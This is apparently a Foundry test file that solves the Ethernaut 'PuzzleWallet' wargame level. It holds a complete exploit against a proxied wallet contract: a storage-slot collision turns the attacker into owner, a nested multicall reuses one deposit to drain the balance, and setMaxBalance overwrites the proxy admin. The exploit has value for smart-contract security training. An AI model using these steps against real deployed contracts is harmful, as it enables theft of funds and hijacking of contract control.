// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {PuzzleWallet, PuzzleProxy, Attacker} from "../src/PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleWallet internal puzzleWallet;
    PuzzleProxy internal puzzleProxy;
    PuzzleWallet internal puzzleProxyAsWallet;
    address internal attacker;
    Attacker internal attackerContract;

    function setUp() public {
        attacker = address(0x1);
        puzzleWallet = new PuzzleWallet();
        bytes memory initData = abi.encodeWithSignature("init(uint256)", 100);
        puzzleProxy = new PuzzleProxy(address(this), address(puzzleWallet), initData);
        puzzleProxyAsWallet = PuzzleWallet(address(puzzleProxy));

        puzzleProxyAsWallet.addToWhitelist(address(this));
        puzzleProxyAsWallet.deposit{value: 1000}();

        vm.deal(attacker, 10 ether);
    }

    function test_Attack() public {
        vm.startPrank(attacker);
        // attackerContract = new Attacker(address(puzzleProxy), address(puzzleWallet));

        // attackerContract.attack();

        puzzleProxy.proposeNewAdmin(attacker);

        puzzleProxyAsWallet.addToWhitelist(attacker);

        bytes[] memory data = new bytes[](3);
        bytes[] memory nestedData = new bytes[](1);
        nestedData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        data[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        data[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedData);
        data[2] = abi.encodeWithSelector(PuzzleWallet.execute.selector, attacker, 2000, "");

        puzzleProxyAsWallet.multicall{value: 1000}(data);

        puzzleProxyAsWallet.setMaxBalance(uint160(attacker));

        assertEq(puzzleProxy.admin(), attacker);

        vm.stopPrank();
    }
}
